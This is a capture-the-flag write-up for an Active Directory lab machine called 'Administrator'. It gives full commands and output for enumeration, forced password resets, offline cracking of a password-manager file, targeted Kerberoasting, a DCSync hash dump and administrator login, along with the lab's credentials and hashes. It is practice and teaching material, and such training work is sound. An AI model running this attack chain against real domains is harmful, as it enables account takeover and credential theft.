- Machine ip and dns-name
```
10.10.11.42 ; administrator.htb
```

- Base credentials 
```
Username: Olivia Password: ichliebedich
```

- Nmap port and services fingerprint:
```
# nmap -sSVC -T4 -Pn -n -p- 10.10.11.42
 
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-09 03:30:36Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
13406/tcp filtered unknown
27751/tcp filtered unknown
29731/tcp filtered unknown
43465/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
57099/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
57104/tcp open     msrpc         Microsoft Windows RPC
57107/tcp open     msrpc         Microsoft Windows RPC
57124/tcp open     msrpc         Microsoft Windows RPC
57156/tcp open     msrpc         Microsoft Windows RPC
61674/tcp open     msrpc         Microsoft Windows RPC
64144/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-09T03:31:30
|_  start_date: N/A

```

- Crackmapexec smb users enumeration
```
# crackmapexec smb -u 'olivia' -p 'ichliebedich' --rid-brute | fgrep 'SidTypeUser'

SMB         10.10.11.42     445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB         10.10.11.42     445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)
SMB         10.10.11.42     445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB         10.10.11.42     445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB         10.10.11.42     445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB         10.10.11.42     445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB         10.10.11.42     445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB         10.10.11.42     445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB         10.10.11.42     445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB         10.10.11.42     445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB         10.10.11.42     445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)
```

- Domains enumeration with bloodhound-python
```
# bloodhound-python -u 'Olivia' -p 'ichliebedich' -c All -d 'administrator.htb' -ns 10.10.11.42
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 38S

```

As we can see, we have 8 users available and a subdomain 'dc.administrator.htb' to lateral movement and pos-exploitation. The user 'olivia' is in the administrator group, let's abuse this privileges and try to change the passwords of other users.
```
$ bloodyAD -u 'olivia' -p 'ichliebedich' -d 'Administrator' --host '10.10.11.42' set password 'Michael' '12345678'
```
For the 'michael' user, we succesfuly changed your password. Now we repeate the same for the others users. 
```
$ bloodyAD -u 'Michael' -p '12345678' -d 'Administrator' --host '10.10.11.42' set password 'Benjamin' '12345678'
```
I tried the same for the users 'emily', 'ethan', 'alexander', and 'emma'. Only the users 'michael' and 'benjamin' that we can change the password.
Now, we can log in the FTP server with this new users and credentials.
```
$ ftp administrator.htb

Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:alves): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||56493|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> 
```

After download the 'Backup.psafe3', we can see that is of a password manager program, we can obtain the hash of this file and try to crack with john with the pwsafe2john tool available in kali
```
# pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050

# john --wordlist=rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)
1g 0:00:00:00 DONE (2024-12-05 23:24) 4.761g/s 29257p/s 29257c/s 29257C/s newzealand..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Now we open the passwordsafe and unlock with the credentials. There have three passwords, let's try login with evil-winrm with this new credentials
Credentials:
```
Alexander UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily	  UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma	  WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

evil-winrm login:
```
# evil-winrm -i 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
- USER.TXT flag
Navigate in the C:\Users\emily\Desktop\ and grab your first flag 

- Privilege Escalation
In this fase we can use Kerberoasting attacks. For this we can automate the entire attack with the following tool available on github: targetKerberoast.py.
```
$ python3 -m venv .
$ source bin/activate
$ pip install -r requirements
$ python targetKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.10.11.42

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$15ec7606ffa3297b86b280475f514f9c$2e4d87fb991fa421183d34d1f57dc6eff6cf90d47f165e99e8caa4042a91278d9ae1897d9b5bd1c4938ae952b02b253b63207405bb7f66b8509c614b4e8a0fe9bff6e4ae67a8c6df5ce80d08d1e2f0cc78389f94289f4fe121f402cf1d8a411db8e49116ae92534989d03f740899d01f2f264273ad4da38a5537fde4c4d629961839c4a7916a3f246240ce1e50602d648a17d05384131d1729c9debfe576e9a37bf347899896e9df8bec3b2ac16110da971e0142ef5435bb73ee2fca6baf923ad26540ff42b735d73ff730cdb075026d0646247db541b3c824a2c8fef6c72572d06c64f341778b0456cbf6376f22bc444228cc4fef86c8bb62093c7081daf6ab75c809508c2ca0ab0fe679e1dbbd753441316d58d1245fdcd9e1b8ef58faa2c71ae319296eeda923da7a42677e65a7ab048b694ea8f880bb021740f94eb4f9b1416d37cd75f41c2b9d045370890611857ae2576e117c1ca52de93918d7104e95c95cd130b2d06805d6c99d5c13b61ab0040f02117accc14a8ad06e2f6d66103c07e9e96a6a2a94f4a12e34e9c3f8b46a305e778a17958128465967076c0365d7c87bb6c517d8ab27d1a89f582a72e303bf0ac54c1c7d2fbe80b2500cab320cdbac803fdfa2c8a54e8db9870a5dd73193a85878752373da71d223e8cdd47dcd2ba3c3b353bc5f1af493da902c90b5a26a218aa6875ff9ffa5bc8bc2f1f90d65502819f01f3c8539950c1d905b2bd803145cfd603a6d75a654ce2c83210b59ed9e6c232841a7d6f5e706072e8e9ed38baaf4c04640841726e61a7f484e900ef1515480ba9b337f80c9cc9d0f974aff33b83897d340a925ab084d60914f708eb5cb917c91ecb362b490f2da965fc476956c7f2d9968ed61b10bdacd2c371955253ebbddfbfc97ee2b38badec0413bca0ec1e11aa44429c6d3d9ab73aaa4a1425fbf23123260c42ed28229e3b766ed0c5682eb6b097b315f72b8ce387978525b3800229f5a0980de2b1f947168c6956d06c8ad9178aefd34addba5e3c9f719619aa29301579cd426415ae8c9d832a93ce3beccf70b58340e949b12e9e6d9d7ef80a3b5852f0e372ba786237cb3f6b2a2738a3b70fd070f5ecd59e5cab52cb145113fc0f4832ba7adc297d6a01167773f9a9a3a5302a0c6a672b1437372d349752350778db5dcdb5f986a7b3110d2584d12a21d32960c061d0f5a60f182257b8954fcd13936b14ef1c6cd5396b2d3549971d83ef116fe4e65916c73f7d231e1c7c99bd82854b152c016f663ecc4c962a30dce3569f088398f8d230996901bfa72f3427ede4d73d1f7b8828fe098c958867c3bd9017002c3e74fbe73650d05228039b57c916ae017e89859afb79c9fb951c815476495819840ae9468fdb66d6ee687de54fed4724c77eee4bd4f9b4995005f644e2b1a58f87deb91088ec9e318fe9d1f6b34a33f6e2e001c2a0e3c0d7f463376a5e3827fadf2a88d6f79d73188b207e06b3207700a5929dd3b6d7fe47bb71402d1881a49a990f0472d912937b66825

$ john hash.txt --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)
1g 0:00:00:00 DONE (2024-12-06 17:35) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
 
- Group and users list
```
Group	      user-name
ADMINISTRATOR Administrator
ADMINISTRATOR Guest
ADMINISTRATOR krbtgt
ADMINISTRATOR DC$
ADMINISTRATOR olivia    -> pass: ichliebedich
ADMINISTRATOR michael	-> pass: 12345678
ADMINISTRATOR benjamin 	-> pass: 12345678
ADMINISTRATOR emily     -> pass: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
ADMINISTRATOR ethan		-> pass: limpbizkit
ADMINISTRATOR alexander
ADMINISTRATOR emma
```

The user 'ethan' can upgrade privileges to administrator by the use of DCSync, getchanges and getchangesall combination grants the ability to perform a DCSync attack. The secrestdump tool of impacket framework can export the hashs of users through the DCSync tech by the use of provided user credentials to connect to the domain through smbexec and obtain high permissions
```
$ impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"Administrator.htb"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```
Finaly, we can use the administrator hash to login and get the final flag
